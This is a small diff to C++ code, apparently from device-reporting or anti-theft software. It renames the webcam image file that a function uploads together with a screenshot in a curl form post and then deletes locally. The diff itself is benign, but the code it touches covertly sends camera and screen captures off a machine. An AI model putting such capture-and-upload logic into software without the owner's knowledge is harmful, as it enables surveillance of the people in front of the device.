@@ -419,7 +419,7 @@ std::string PassiveConnection::submitImages(std::string reportID,
 			CURLFORM_FILE, "screenshot.png", CURLFORM_END);
 	// Webcam
 	curl_formadd(&formpost, &lastptr, CURLFORM_COPYNAME, "webcam",
-			CURLFORM_FILE, "00000001.png", CURLFORM_END);
+			CURLFORM_FILE, "webcam.jpeg", CURLFORM_END);
 
 	curl = curl_easy_init();
 
@@ -452,7 +452,7 @@ std::string PassiveConnection::submitImages(std::string reportID,
 
 	// Clean up files
 	std::remove("screenshot.png");
-	std::remove("00000001.png");
+	std::remove("webcam.jpeg");
 
 	return result;
 }
